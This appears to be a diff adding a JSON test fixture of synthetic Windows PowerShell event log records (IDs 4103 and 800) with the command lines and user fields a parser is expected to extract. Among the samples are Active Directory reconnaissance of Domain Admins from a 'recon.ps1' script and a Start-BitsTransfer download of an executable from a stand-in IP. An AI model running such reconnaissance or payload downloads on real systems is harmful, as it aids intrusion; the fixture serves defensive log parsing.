@@ -1,0 +1,237 @@
+[
+ {
+  "name": "4103: the command rebuilt from its parameters, who ran it, from which script",
+  "event": {
+   "Event": {
+    "System": {
+     "Provider": {
+      "#attributes": {
+       "Name": "Microsoft-Windows-PowerShell",
+       "Guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      }
+     },
+     "EventID": 4103,
+     "Version": 1,
+     "Level": 4,
+     "Task": 106,
+     "Opcode": 20,
+     "Keywords": "0x0",
+     "TimeCreated": {
+      "#attributes": {
+       "SystemTime": "2026-09-01T09:20:00.000000Z"
+      }
+     },
+     "EventRecordID": 55,
+     "Execution": {
+      "#attributes": {
+       "ProcessID": 4242,
+       "ThreadID": 11
+      }
+     },
+     "Channel": "Microsoft-Windows-PowerShell/Operational",
+     "Computer": "ws01.corp.local",
+     "Security": {
+      "#attributes": {
+       "UserID": "S-1-5-21-1-2-3-1104"
+      }
+     }
+    },
+    "EventData": {
+     "ContextInfo": "        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Command Name = Get-ADGroupMember\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Users\\alice\\recon.ps1\r\n        User = CORP\\alice\r\n        Connected User = \r\n",
+     "UserData": "",
+     "Payload": "CommandInvocation(Get-ADGroupMember): \"Get-ADGroupMember\"\r\nParameterBinding(Get-ADGroupMember): name=\"Identity\"; value=\"Domain Admins\"\r\nParameterBinding(Get-ADGroupMember): name=\"Recursive\"; value=\"True\""
+    }
+   }
+  },
+  "expect": {
+   "commandLine": "Get-ADGroupMember -Identity 'Domain Admins' -Recursive",
+   "subjectDomain": "CORP",
+   "subjectUser": "alice",
+   "path": "C:\\Users\\alice\\recon.ps1"
+  }
+ },
+ {
+  "name": "4103: a value over several lines, a quote in it, an error after it",
+  "event": {
+   "Event": {
+    "System": {
+     "Provider": {
+      "#attributes": {
+       "Name": "Microsoft-Windows-PowerShell",
+       "Guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      }
+     },
+     "EventID": 4103,
+     "Version": 1,
+     "Level": 4,
+     "Task": 106,
+     "Opcode": 20,
+     "Keywords": "0x0",
+     "TimeCreated": {
+      "#attributes": {
+       "SystemTime": "2026-09-01T09:20:00.000000Z"
+      }
+     },
+     "EventRecordID": 55,
+     "Execution": {
+      "#attributes": {
+       "ProcessID": 4242,
+       "ThreadID": 11
+      }
+     },
+     "Channel": "Microsoft-Windows-PowerShell/Operational",
+     "Computer": "ws01.corp.local",
+     "Security": {
+      "#attributes": {
+       "UserID": "S-1-5-21-1-2-3-1104"
+      }
+     }
+    },
+    "EventData": {
+     "ContextInfo": "        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Command Name = Get-ADGroupMember\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Users\\alice\\recon.ps1\r\n        User = CORP\\alice\r\n        Connected User = \r\n",
+     "UserData": "",
+     "Payload": "CommandInvocation(Set-Content): \"Set-Content\"\r\nParameterBinding(Set-Content): name=\"Path\"; value=\"C:\\Temp\\a.ps1\"\r\nParameterBinding(Set-Content): name=\"Value\"; value=\"line one\r\nit's line two\"\r\nNonTerminatingError(Set-Content): \"Access denied\""
+    }
+   }
+  },
+  "expect": {
+   "commandLine": "Set-Content -Path 'C:\\Temp\\a.ps1' -Value 'line one\nit''s line two'"
+  }
+ },
+ {
+  "name": "4103: only what the host adds (Out-Default) gives no command",
+  "event": {
+   "Event": {
+    "System": {
+     "Provider": {
+      "#attributes": {
+       "Name": "Microsoft-Windows-PowerShell",
+       "Guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      }
+     },
+     "EventID": 4103,
+     "Version": 1,
+     "Level": 4,
+     "Task": 106,
+     "Opcode": 20,
+     "Keywords": "0x0",
+     "TimeCreated": {
+      "#attributes": {
+       "SystemTime": "2026-09-01T09:20:00.000000Z"
+      }
+     },
+     "EventRecordID": 55,
+     "Execution": {
+      "#attributes": {
+       "ProcessID": 4242,
+       "ThreadID": 11
+      }
+     },
+     "Channel": "Microsoft-Windows-PowerShell/Operational",
+     "Computer": "ws01.corp.local",
+     "Security": {
+      "#attributes": {
+       "UserID": "S-1-5-21-1-2-3-1104"
+      }
+     }
+    },
+    "EventData": {
+     "ContextInfo": "        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Command Name = Get-ADGroupMember\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Users\\alice\\recon.ps1\r\n        User = CORP\\alice\r\n        Connected User = \r\n",
+     "UserData": "",
+     "Payload": "CommandInvocation(Out-Default): \"Out-Default\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"CN=Domain Admins,CN=Users,DC=corp,DC=local\""
+    }
+   }
+  },
+  "expect": {
+   "commandLine": null,
+   "subjectUser": "alice"
+  }
+ },
+ {
+  "name": "800: the command as typed",
+  "event": {
+   "Event": {
+    "System": {
+     "Provider": {
+      "#attributes": {
+       "Name": "PowerShell"
+      }
+     },
+     "EventID": {
+      "#attributes": {
+       "Qualifiers": 0
+      },
+      "#text": 800
+     },
+     "Level": 4,
+     "Task": 8,
+     "Keywords": "0x80000000000000",
+     "TimeCreated": {
+      "#attributes": {
+       "SystemTime": "2026-09-01T09:20:01.000000Z"
+      }
+     },
+     "EventRecordID": 56,
+     "Channel": "Windows PowerShell",
+     "Computer": "ws01.corp.local",
+     "Security": null
+    },
+    "EventData": {
+     "Data": [
+      "Get-ADGroupMember -Identity 'Domain Admins'",
+      "\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=12\r\n\r\n\tUserId=CORP\\alice\r\n\tHostName=ConsoleHost\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tScriptName=\r\n\tCommandLine=Get-ADGroupMember -Identity 'Domain Admins'",
+      "CommandInvocation(Get-ADGroupMember): \"Get-ADGroupMember\"\r\nParameterBinding(Get-ADGroupMember): name=\"Identity\"; value=\"Domain Admins\"\r\n"
+     ]
+    }
+   }
+  },
+  "expect": {
+   "commandLine": "Get-ADGroupMember -Identity 'Domain Admins'",
+   "subjectDomain": "CORP",
+   "subjectUser": "alice",
+   "path": null
+  }
+ },
+ {
+  "name": "800: nothing typed, the command rebuilt",
+  "event": {
+   "Event": {
+    "System": {
+     "Provider": {
+      "#attributes": {
+       "Name": "PowerShell"
+      }
+     },
+     "EventID": {
+      "#attributes": {
+       "Qualifiers": 0
+      },
+      "#text": 800
+     },
+     "Level": 4,
+     "Task": 8,
+     "Keywords": "0x80000000000000",
+     "TimeCreated": {
+      "#attributes": {
+       "SystemTime": "2026-09-01T09:20:01.000000Z"
+      }
+     },
+     "EventRecordID": 56,
+     "Channel": "Windows PowerShell",
+     "Computer": "ws01.corp.local",
+     "Security": null
+    },
+    "EventData": {
+     "Data": [
+      "",
+      "\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=12\r\n\r\n\tUserId=CORP\\alice\r\n\tHostName=ConsoleHost\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tScriptName=\r\n\tCommandLine=Get-ADGroupMember -Identity 'Domain Admins'",
+      "CommandInvocation(Start-BitsTransfer): \"Start-BitsTransfer\"\r\nParameterBinding(Start-BitsTransfer): name=\"Source\"; value=\"https://203.0.113.5/a.exe\"\r\n"
+     ]
+    }
+   }
+  },
+  "expect": {
+   "commandLine": "Start-BitsTransfer -Source 'https://203.0.113.5/a.exe'"
+  }
+ }
+]
